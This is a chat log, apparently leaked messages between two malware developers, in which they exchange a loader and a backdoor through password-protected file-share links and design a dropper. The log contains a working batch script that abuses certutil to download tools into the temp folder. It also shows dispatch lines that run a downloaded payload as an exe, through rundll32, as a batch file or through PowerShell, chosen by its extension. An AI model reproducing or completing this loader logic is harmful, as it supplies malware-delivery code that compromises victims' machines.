@@ -1,0 +1,228 @@
+2020-09-08T15:32:15 mushroom -> dandis
+Hi:
+bd2:
+Download: https://qaz.im/load/fNzF2z/73aKke
+Delete: https://qaz.im/index.php?a=delete&q=679421896
+Password: 4C>!f.~<U:$z&J:O,
+
+2020-09-08T15:32:33 mushroom -> dandis
+dl2:
+Download: https://qaz.im/load/kf2SFS/kAziR8
+Delete: https://qaz.im/index.php?a=delete&q=956444246
+Password: (~nIZ'CG)iwq""AN"
+
+2020-09-08T15:32:55 mushroom -> dandis
+For the tests Buza told me to give you.
+
+2020-09-08T15:33:16 mushroom -> dandis
+dl2 loader, bd2 backdoor.
+
+2020-09-08T15:33:45 mushroom -> dandis
+You run dl2.exe it downloads the backdoor and runs it. Group two.
+
+2020-09-08T15:33:59 mushroom -> dandis
+Right now all the versions with logs are uploaded there.
+
+2020-09-08T15:50:37 mushroom -> dandis
+Is the connection working?
+
+2020-10-02T10:46:33 mushroom -> dandis
+Hi. Send me my curldowload.cmd script, I deleted it by mistake.
+
+2020-10-02T11:06:28 mushroom -> dandis
+Made exe, dll, cmd, ps1.
+
+2020-10-02T12:01:16 dandis -> mushroom
+Hi
+
+2020-10-02T12:03:27 dandis -> mushroom
+
+@echo off
+
+setlocal
+set an="%TEMP%\%%RANDOM%.zip"
+certutil -urlcache -split -f "https://curl.haxx.se/windows/dl-7.72.0_3/curl-7.72.0_3-win32-mingw.zip" %an%
+
+set uz="%TEMP%\%RANDOM%.exe"
+certutil -urlcache -split -f "http://stahlworks.com/dev/unzip.exe" %uz%
+
+set ud="%TEMP%\%%RANDOM%"
+%uz% -qq %an% -d "%ud%"
+del /q %uz%
+
+del /q %an%
+where /r "%ud%" curl.exe
+endlocal
+
+2020-10-02T12:03:38 dandis -> mushroom
+
+" > Made exe, dll, cmd, ps1.
+Can this be crammed into one file?
+
+2020-10-02T12:03:45 dandis -> mushroom
+Like a dll with an eche.
+
+2020-10-02T12:04:17 mushroom -> dandis
+And how do you know what to run, command line arguments to use?
+
+2020-10-02T12:07:56 mushroom -> dandis
+I'll do it now. At the beginning of the script will be set type=
+
+2020-10-02T12:08:10 mushroom -> dandis
+there you can select exe,dll,cmd,ps1
+
+2020-10-02T12:09:29 dandis -> mushroom
+The point is that I need support for all 4 options in one file
+
+2020-10-02T12:09:38 dandis -> mushroom
+Or hang 4 schtashes per file?
+
+2020-10-02T12:09:44 dandis -> mushroom
+And they will knock on the url 4 times each?
+
+2020-10-02T12:10:18 mushroom -> dandis
+So will there be one download?
+
+2020-10-02T12:10:27 mushroom -> dandis
+And run a single file.
+
+2020-10-02T12:10:55 mushroom -> dandis
+Does it need to figure out what type of file it downloaded itself?
+
+2020-10-02T12:11:37 dandis -> mushroom
+Yes
+
+2020-10-02T12:12:09 mushroom -> dandis
+This will not distinguish cmd from ps1 for example exactly.
+
+2020-10-02T12:12:46 mushroom -> dandis
+You can tell from the link if it specifies a file extension.
+
+2020-10-02T12:13:07 mushroom -> dandis
+For example localhost/static/TestOutput64.cmd
+
+2020-10-02T12:13:13 mushroom -> dandis
+localhost/static/TestOutput64.ps1
+
+2020-10-02T12:13:16 mushroom -> dandis
+localhost/static/TestOutput64.exe
+
+2020-10-02T12:13:21 mushroom -> dandis
+localhost/static/TestOutput64.dll
+
+2020-10-02T12:13:39 mushroom -> dandis
+Such links for downloading, for example, or not?
+
+2020-10-02T12:14:29 mushroom -> dandis
+Or localhost/static/HOWEOIFH023
+
+2020-10-02T12:14:44 mushroom -> dandis
+localhost/static/nf20[93hf30=8§h
+
+2020-10-02T12:14:56 mushroom -> dandis
+And then it is not clear which file you download.
+
+2020-10-02T12:15:51 dandis -> mushroom
+
+" [08:13:06] <mushroom> For example localhost/static/TestOutput64.cmd
+" [08:13:11] <mushroom> localhost/static/TestOutput64.ps1
+" [08:13:15] <mushroom> localhost/static/TestOutput64.exe
+" [08:13:20] <mushroom> localhost/static/TestOutput64.dll
+
+2020-10-02T12:15:52 dandis -> mushroom
+Yes
+
+2020-10-02T12:16:04 mushroom -> dandis
+I'll do it then.
+
+2020-10-02T13:11:42 mushroom -> dandis
+Here:
+Download: https://qaz.im/load/FfG96E/yhbRhF
+Delete: https://qaz.im/index.php?a=delete&q=899814883
+Password: |]`,d@'RQfk7Nua`Q
+
+2020-10-02T13:12:07 mushroom -> dandis
+One for all runs is download_run.cmd
+
+2020-10-05T08:43:58 mushroom -> dandis
+Hi. What about the scripts?
+
+2020-10-05T08:44:58 dandis -> mushroom
+Hi, send the last one again
+
+2020-10-05T08:45:49 mushroom -> dandis
+Download: https://qaz.im/load/FfG96E/yhbRhF
+Delete: https://qaz.im/index.php?a=delete&q=899814883
+Password: |]`,d@'RQfk7Nua`Q
+
+2020-10-05T08:46:05 mushroom -> dandis
+So I haven't checked it out yet.
+
+2020-10-05T08:46:18 dandis -> mushroom
+Empty
+
+2020-10-05T08:46:46 mushroom -> dandis
+Link?
+
+2020-10-05T08:47:20 dandis -> mushroom
+Fileo 0b.
+
+2020-10-05T08:50:22 mushroom -> dandis
+Download: https://qaz.im/load/a87zyT/7YfAbb
+Delete: https://qaz.im/index.php?a=delete&q=1002403784
+Password: :}bjH*S5JIjlqVA1]
+
+2020-10-05T08:56:06 dandis -> mushroom
+Does Download_run run the file depending on the type?
+
+2020-10-05T08:56:45 mushroom -> dandis
+Yes. Depending on what's at the end of the link (exe, dll, cmd, bat, ps1).
+
+2020-10-05T08:57:29 dandis -> mushroom
+How does it determine what's at the end of the link?
+
+2020-10-05T08:58:12 mushroom -> dandis
+On the last 3 characters.
+
+2020-10-05T08:58:24 mushroom -> dandis
+http://localhost/static/example.exe
+
+2020-10-05T08:58:31 mushroom -> dandis
+at the end of exe
+
+2020-10-05T08:58:43 mushroom -> dandis
+http://localhost/static/example.dll
+
+2020-10-05T08:58:51 mushroom -> dandis
+Like this.
+
+2020-10-05T09:06:12 dandis -> mushroom
+Couldn't you make a unified url?
+
+2020-10-05T09:07:06 mushroom -> dandis
+Then it's not clear what type of file to run. They run a little differently.
+
+2020-10-05T09:07:22 mushroom -> dandis
+if %e%==exe %df% %args%
+if %e%==dll rundll32 %df%,%args%
+if %e%==cmd call %df% %args%
+if %e%==bat call %df% %args%
+if %e%==ps1 powershell -File %df% %args%
+
+2020-10-05T09:07:39 mushroom -> dandis
+Each file type runs a little differently.
+
+2020-10-05T09:08:33 mushroom -> dandis
+You can tell exe from dll and from scripts, but bat from ps1 can't be distinguished in any way. Both are just a bunch of words.
+
+2020-10-05T09:09:08 mushroom -> dandis
+[08:13:06] <mushroom> For example localhost/static/TestOutput64.cmd
+" [08:13:11] <mushroom> localhost/static/TestOutput64.ps1
+" [08:13:15] <mushroom> localhost/static/TestOutput64.exe
+" [08:13:20] <mushroom> localhost/static/TestOutput64.dll
+
+[15:15:52] <doomsday> Yes
+
+2020-10-05T09:09:23 mushroom -> dandis
+You wrote that the links would be like that.
+
